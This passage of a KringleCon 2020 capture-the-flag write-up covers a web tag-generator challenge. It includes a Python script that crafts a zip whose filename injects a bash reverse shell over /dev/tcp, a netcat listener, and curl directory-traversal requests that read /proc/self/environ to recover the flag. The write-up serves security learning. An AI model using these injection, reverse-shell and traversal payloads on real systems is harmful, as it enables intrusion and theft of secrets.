+<p>In other words, we should be able to do RCE if the extracted value calls a command (e.g. <code>/tmp/; &lt;RCE here&gt;</code>). Therefore, let's create a zipfile that contains a file with a reverse shell name.</p>
+<pre><code class="language-bash">root@kali:~/kringlecon20/challenges/08-broken-tag-generator# python3 code/weaponize.py
+</code></pre>
+<pre><code class="language-python"># weaponize.py
+
+ip_address = '127.0.0.1' # currently on localhost, change when needed
+port = '1337'
+
+# bash reverse shell
+rs = &quot;/bin/bash -i 1&gt;&amp; /dev/tcp/&quot; + ip_address + &quot;/&quot; + port + &quot; 0&gt;&amp;1&quot;
+
+filename = &quot;'; &quot; + rs + &quot;; 'foo.png&quot;
+
+with zp.ZipFile('payloads/rce.zip', 'w') as z:
+    z.writestr(filename, 'poop')
+</code></pre>
+<h3 id="delivery">Delivery</h3>
+<h4 id="step-11">Step 11</h4>
+<p>Let's spin up a netcat listener for port 1337 on our VM</p>
+<pre><code class="language-bash">root@kali:~/kringlecon20/challenges/08-broken-tag-generator# nc -nvlp 1337
+</code></pre>
+<p>And upload the payload through the web app and wait for the code to execute.</p>
+<p>After hours of debugging, it turns out that I can't make connections back to my attacking machine. Since I disabled all the firewalls and the reverse shell works when tested on an LAN, the connection issue is probably due to my router configuration blocking specific incoming connections.</p>
+<h4 id="step-12">Step 12</h4>
+<p>Let's try an LFI approach instead of the RCE approach above and thus do some directory traversal.</p>
+<p>According to <a href="https://stackoverflow.com/questions/10080656/where-to-put-environment-variables-when-using-nginx-and-passenger-on-ubuntu">Alex North-Keys &amp; Gautam Chibde</a>, processes can view environment variables via <code>ps</code> or via looking a <code>/proc/*/environ</code>. Since we can only use <code>curl</code> to view files, <code>/proc/*/environ</code> may be the best way to approach this.</p>
+<p>Using <a href="https://www.linux.com/news/discover-possibilities-proc-directory/">this site from linux.com</a> as a guideline to <code>/proc</code>:</p>
+<pre><code class="language-bash">root@kali:~/kringlecon20/challenges/08-broken-tag-generator/# curl https://tag-generator.kringlecastle.com/image\?id\=../../../../proc/cmdline
+BOOT_IMAGE=/boot/vmlinuz-4.19.0-13-cloud-amd64 root=UUID=27007375-5b74-4fcf-afc6-962faabdffb7 ro console=tty0 console=ttyS0,115200 earlyprintk=ttyS0,115200 scsi_mod.use_blk_mq=Y
+root@kali:~/kringlecon20/challenges/08-broken-tag-generator/# curl https://tag-generator.kringlecastle.com/image\?id\=../../../../proc/self/environ --output -
+PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app
+</code></pre>
+<h4 id="flag">Flag</h4>
+<p><code>JackFrostWasHere</code></p>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../07-can-d-bus-problem/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Objective 07
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../09-arp-shenanigans/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Objective 09
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/vendor.93c04032.min.js"></script>
+      <script src="../../assets/javascripts/bundle.83e5331e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../..",
+          features: [],
+          search: Object.assign({
+            worker: "../../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
